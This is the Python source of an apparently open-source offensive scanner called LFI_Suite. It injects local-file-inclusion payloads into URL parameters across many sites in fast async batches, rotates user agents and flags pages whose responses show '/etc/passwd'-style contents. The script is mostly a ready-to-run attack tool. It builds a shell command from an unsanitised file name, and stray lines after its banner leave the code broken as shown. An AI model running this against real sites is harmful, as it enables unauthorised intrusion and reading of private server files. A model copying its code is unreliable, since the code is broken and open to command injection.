import asyncio
import aiohttp
import argparse
import random
import re
import subprocess
from colorama import init, Fore, Style
import time

init(autoreset=True)

ascii_art = f"""{Fore.LIGHTCYAN_EX}
    ___    _______.___________.__        _____             __          
   /  /   /   _____|   \_   ___ \  |__   /     \ _____  ___/  |_  ____  
  /  /    \_____  \|   /    \  \/  |  \ /  \ /  \\__  \ \__  \   __\/ __ \ 
 /  /___  /        \   \     \___|   Y  Y    Y    \/ __ \_/ __ \|  | \  ___/
/_____/  \_______  /___|\______  /___|  \____|__  (____  (____  /__|  \___  >
                \/             \/      \/       \/     \/     \/          \

🎯 LFI_Suite
⚡ Created by zapstiko
🐍 Fast. Focused. Functional.
"""
{Style.RESET_ALL}
"""

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.6167.160 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
]

DEFAULT_BATCH_SIZE = 150
DEFAULT_BATCH_DELAY = 1.5
DEFAULT_TIMEOUT = 1.8
DEFAULT_RETRY_COUNT = 1

successful_attempts = 0
failed_attempts = 0
timeout_attempts = 0
total_processed = 0

def run_gf_lfi(input_file):
    try:
        result = subprocess.run(f"cat {input_file} | gf lfi", shell=True, check=True, capture_output=True, text=True)
        lines = result.stdout.strip().split('\n')
        fuzzed_urls = [re.sub(r'=[^&]+', '=FUZZ', line) for line in lines if '=' in line]
        return fuzzed_urls
    except subprocess.CalledProcessError as e:
        print(f"{Fore.RED}[!] gf lfi execution failed. Ensure gf is installed and working.")
        return []

def match_vulnerability(content, patterns):
    for pattern in patterns:
        if re.search(pattern, content, re.IGNORECASE):
            return True
    return False

def inject_payload(fuzzed_url, payload):
    return fuzzed_url.replace("FUZZ", payload)

async def send_request(session, method, full_url, matcher_patterns, timeout, retry_count):
    global successful_attempts, failed_attempts, timeout_attempts, total_processed
    headers = {
        "User-Agent": random.choice(user_agents),
        "Accept": "*/*",
        "Connection": "close"
    }

    for _ in range(retry_count):
        try:
            if method == "GET":
                async with session.get(full_url, headers=headers, ssl=False, timeout=timeout) as response:
                    content = await response.text()
            else:
                async with session.post(full_url, headers=headers, ssl=False, timeout=timeout, data={}) as response:
                    content = await response.text()

            total_processed += 1
            if match_vulnerability(content, matcher_patterns):
                successful_attempts += 1
                print(f"{Fore.GREEN}[VULNERABLE] {full_url}")
                with open("output.txt", "a") as f:
                    f.write(f"[VULNERABLE] {full_url}\n")
                break
            else:
                failed_attempts += 1
                break
        except asyncio.TimeoutError:
            timeout_attempts += 1
        except Exception:
            failed_attempts += 1
            break

async def process_batch(session, method, urls, payloads, matcher_patterns, batch_size, batch_delay, timeout, retry_count):
    batch = []
    for url in urls:
        for payload in payloads:
            full_url = inject_payload(url, payload)
            batch.append(send_request(session, method, full_url, matcher_patterns, timeout, retry_count))
            if len(batch) >= batch_size:
                await asyncio.gather(*batch)
                print(f"{Fore.BLUE}Batch done. Sleeping {batch_delay}s...\n")
                batch = []
                await asyncio.sleep(batch_delay)
    if batch:
        await asyncio.gather(*batch)

async def main(args):
    print(ascii_art)

    fuzzed_urls = run_gf_lfi(args.domains)
    if not fuzzed_urls:
        print(f"{Fore.RED}[!] No LFI parameters found in input.")
        return

    payloads = [line.strip() for line in open(args.payloads).readlines()]
    matcher_patterns = args.matchers.split("|")

    connector = aiohttp.TCPConnector(ssl=False)
    session_params = {
        "connector": connector,
        "trust_env": True
    }

    if args.proxy:
        session_params["proxy"] = args.proxy

    method = "POST" if args.post else "GET"

    async with aiohttp.ClientSession(**session_params) as session:
        start_time = time.time()
        await process_batch(session, method, fuzzed_urls, payloads, matcher_patterns, args.batch_size, args.batch_delay, args.timeout, args.retry_count)
        duration = time.time() - start_time

    print(f"\n{Fore.LIGHTGREEN_EX}🎯 Scan complete.")
    print(f"{Fore.GREEN}✔ Success: {successful_attempts}")
    print(f"{Fore.RED}✘ Failed: {failed_attempts}")
    print(f"{Fore.YELLOW}⌛ Timeout: {timeout_attempts}")
    print(f"{Fore.CYAN}📈 Total Processed: {total_processed}")
    print(f"{Fore.CYAN}⏱ Elapsed Time: {duration:.2f}s")
    if duration > 0:
        print(f"{Fore.MAGENTA}🚀 Speed: {total_processed / duration:.2f} req/s")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="🎯 LFI_Suite - Created by zapstiko")
    parser.add_argument("-d", "--domains", required=True, help="Path to file with raw URLs")
    parser.add_argument("-p", "--payloads", required=True, help="Path to file with LFI payloads")
    parser.add_argument("-m", "--matchers", default="root:x|/bin/bash|include_path|open_basedir|No such file|Permission denied|on line [0-9]+|failed to open stream|HTTP/1.1 500 Internal Server Error", help="Custom matcher patterns separated by '|'")
    parser.add_argument("--post", action="store_true", help="Use POST instead of GET")
    parser.add_argument("--proxy", help="Proxy (e.g. http://127.0.0.1:8080)")
    parser.add_argument("-b", "--batch-size", type=int, default=DEFAULT_BATCH_SIZE)
    parser.add_argument("-bd", "--batch-delay", type=float, default=DEFAULT_BATCH_DELAY)
    parser.add_argument("-t", "--timeout", type=float, default=DEFAULT_TIMEOUT)
    parser.add_argument("-r", "--retry-count", type=int, default=DEFAULT_RETRY_COUNT)
    args = parser.parse_args()

    asyncio.run(main(args))
